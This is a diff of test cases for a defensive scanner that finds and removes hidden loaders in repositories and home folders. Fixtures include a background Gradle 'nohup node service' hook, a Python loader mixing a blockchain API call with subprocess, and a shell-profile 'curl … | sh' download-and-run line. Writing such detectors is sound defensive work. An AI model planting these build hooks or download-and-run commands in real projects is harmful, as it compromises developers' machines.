@@ -735,6 +735,135 @@ test('warns when .gitignore drops the .env rule even if no .env file exists yet'
   rmSync(root, { recursive: true, force: true });
 });
 
+// ---- variants seen later: a loader called service, a Gradle launcher and a Python loader ----
+
+const bigTail = (head) => `${head}${' '.repeat(300)}${'x'.repeat(2000)}\n`;
+
+test('finds the loader when it is called service and runs from package.json', () => {
+  const root = tmp();
+  put(root, 'service', bigTail('const a = 1;'));
+  put(root, 'package.json', JSON.stringify({ scripts: { dev: 'node service && next dev', build: 'next build' } }));
+  const found = scan(root).findings.map((f) => `${f.rule}:${f.file}`).sort();
+  assert.deepEqual(found, ['hidden-code:service', 'script:package.json']);
+  fix(scan(root));
+  assert.equal(existsSync(path.join(root, 'service')), false);
+  assert.equal(JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8')).scripts.dev, 'next dev');
+  assert.equal(scan(root).findings.length, 0);
+  rmSync(root, { recursive: true, force: true });
+});
+
+test('does not flag a normal service.js script or a plain extensionless file', () => {
+  const root = tmp();
+  put(root, 'package.json', JSON.stringify({ scripts: { start: 'node service.js' } }));
+  put(root, 'LICENSE', 'MIT License\n'.repeat(40));
+  put(root, 'Makefile', 'all:\n\techo hi\n');
+  assert.equal(scan(root).findings.length, 0);
+  rmSync(root, { recursive: true, force: true });
+});
+
+test('finds and removes a Gradle task that starts a hidden node process', () => {
+  const root = tmp();
+  const top = `plugins {\n    id 'com.android.application' version '8.5.2' apply false\n}\n\ntasks.register("startApi", Exec) {\n    workingDir rootProject.projectDir\n    commandLine "sh", "-c", "nohup node service >/dev/null 2>&1 &"\n}\n`;
+  const app = `android {\n    namespace 'x'\n}\n\ntasks.named("preBuild") {\n    dependsOn(rootProject.tasks.named("startApi"))\n}\n`;
+  put(root, 'build.gradle', top);
+  put(root, 'app/build.gradle', app);
+  const found = scan(root).findings.filter((f) => f.rule === 'gradle-loader').map((f) => f.file).sort();
+  assert.deepEqual(found, ['app/build.gradle', 'build.gradle']);
+  fix(scan(root));
+  const a = readFileSync(path.join(root, 'build.gradle'), 'utf8');
+  assert.ok(!/startApi|nohup/.test(a) && /com\.android\.application/.test(a), a);
+  const b = readFileSync(path.join(root, 'app/build.gradle'), 'utf8');
+  assert.ok(!/startApi|dependsOn/.test(b) && /namespace/.test(b), b);
+  assert.equal(scan(root).findings.length, 0);
+  rmSync(root, { recursive: true, force: true });
+});
+
+test('a normal Gradle build that runs node in the open is left alone', () => {
+  const root = tmp();
+  put(root, 'build.gradle', `tasks.register("bundle", Exec) {\n    commandLine "node", "scripts/bundle.js"\n}\n`);
+  assert.equal(scan(root).findings.length, 0);
+  rmSync(root, { recursive: true, force: true });
+});
+
+test('finds a Python loader that reads a blockchain API, deletes it and the import of it', () => {
+  const root = tmp();
+  const loader = `import json as _json\nimport subprocess as _sp\nimport urllib.request as _ur\n_rows = _ur.urlopen("https://api.ethplorer.io/getAddressTransactions/0xabc")\n_src = bytes.fromhex("00").decode()\n_sp.run(["node", "x.js"])\n`;
+  put(root, 'tools/utils/transport.py', loader);
+  put(root, 'tools/utils/__init__.py', '');
+  put(root, 'tools/fetch.py', 'import utils.transport\nimport json\n\nprint(1)\n');
+  const found = scan(root).findings.filter((f) => f.rule === 'python-loader');
+  assert.deepEqual(found.map((f) => f.file), ['tools/utils/transport.py']);
+  fix(scan(root));
+  assert.equal(existsSync(path.join(root, 'tools/utils/transport.py')), false);
+  assert.equal(readFileSync(path.join(root, 'tools/fetch.py'), 'utf8'), 'import json\n\nprint(1)\n');
+  assert.equal(scan(root).findings.filter((f) => f.level === 'high').length, 0);
+  rmSync(root, { recursive: true, force: true });
+});
+
+test('a Python script that only talks to a blockchain API is not flagged', () => {
+  const root = tmp();
+  put(root, 'price.py', 'import urllib.request\nrows = urllib.request.urlopen("https://api.ethplorer.io/getAddressInfo/0x1")\nprint(rows.read())\n');
+  assert.equal(scan(root).findings.length, 0);
+  rmSync(root, { recursive: true, force: true });
+});
+
+// ---- forkguard host and forkguard pushes ----
+
+test('host finds the hidden loader folder, its files, a running process and a history trace', async () => {
+  const { hostCheck } = await import('../src/host.js');
+  const home = tmp();
+  mkdirSync(path.join(home, '.node_modules'));
+  writeFileSync(path.join(home, '.node_modules', '.npm-ws-runner.js'), '// defanged\n');
+  writeFileSync(path.join(home, '.zsh_history'), ': 1:0;ls\n: 2:0;node service\n: 3:0;export TOKEN=secret-value\n');
+  writeFileSync(path.join(home, '.zshrc'), 'export PATH=$PATH:/usr/local/bin\n');
+  const run = (cmd) => (cmd === 'ps' ? '101 /usr/bin/python3 app.py\n202 node /Users/me/.node_modules/.npm-ws-runner.js\n' : '');
+  const r = hostCheck({ home, platform: 'linux', run, projects: [], tmp: [] });
+  const areas = r.findings.map((f) => f.area).sort();
+  assert.deepEqual(areas, ['folder', 'folder', 'history', 'process']);
+  assert.equal(r.verdict, 'likely-infected');
+  const text = JSON.stringify(r);
+  assert.ok(!text.includes('secret-value'), 'a secret in shell history must never be copied into the result');
+  rmSync(home, { recursive: true, force: true });
+});
+
+test('host says nothing found for an ordinary home folder, and notes logins without opening them', async () => {
+  const { hostCheck } = await import('../src/host.js');
+  const home = tmp();
+  writeFileSync(path.join(home, '.npmrc'), '//registry.npmjs.org/:_authToken=do-not-read-me\n');
+  writeFileSync(path.join(home, '.zshrc'), 'alias ll="ls -la"\n');
+  const r = hostCheck({ home, platform: 'darwin', run: () => '', projects: [], tmp: [] });
+  assert.equal(r.verdict, 'nothing-found');
+  assert.deepEqual(r.exposure.map((e) => e.where), [path.join('~', '.npmrc')]);
+  assert.ok(!JSON.stringify(r).includes('do-not-read-me'));
+  rmSync(home, { recursive: true, force: true });
+});
+
+test('host flags a shell profile that downloads and runs code, and an infected project', async () => {
+  const { hostCheck } = await import('../src/host.js');
+  const home = tmp();
+  writeFileSync(path.join(home, '.zshrc'), 'curl -s https://example.test/x | sh\n');
+  const proj = path.join(home, 'Developer', 'app');
+  mkdirSync(proj, { recursive: true });
+  put(proj, 'init', `const a = 1;${payload()}\n`);
+  const r = hostCheck({ home, platform: 'linux', run: () => '', tmp: [] });
+  assert.ok(r.findings.some((f) => f.area === 'profile' && f.level === 'medium'));
+  assert.ok(r.findings.some((f) => f.area === 'project'));
+  rmSync(home, { recursive: true, force: true });
+});
+
+test('pushes turns activity into events and finds a script going through several repos', async () => {
+  const { toEvents, findWaves } = await import('../src/pushes.js');
+  const at = (min, sec = 0) => new Date(Date.UTC(2026, 10, 26, 12, min, sec)).toISOString();
+  const item = (repo, when) => toEvents(repo, [{ timestamp: when, activity_type: 'force_push', ref: 'refs/heads/main', before: 'a'.repeat(40), after: 'b'.repeat(40), actor: { login: 'me' } }])[0];
+  const wave = [item('me/a', at(19)), item('me/b', at(19, 5)), item('me/c', at(19, 10)), item('me/d', at(20))];
+  const quiet = [item('me/a', at(50)), item('me/a', at(55))];
+  assert.equal(wave[0].branch, 'main');
+  assert.equal(wave[0].before, 'aaaaaaa');
+  assert.equal(findWaves([...wave, ...quiet]).length, 1);
+  assert.equal(findWaves(quiet).length, 0);
+  assert.equal(findWaves([...wave, item('me/e', at(40)), item('me/f', at(40, 4)), item('me/g', at(40, 8))]).length, 2);
+});
+
 test('the pull request text is plain and lists what changed', async () => {
   const { prBody } = await import('../src/pr.js');
   const body = prBody([{ file: 'init', action: 'deleted' }, { file: 'package.json', action: 'cleaned' }], []);
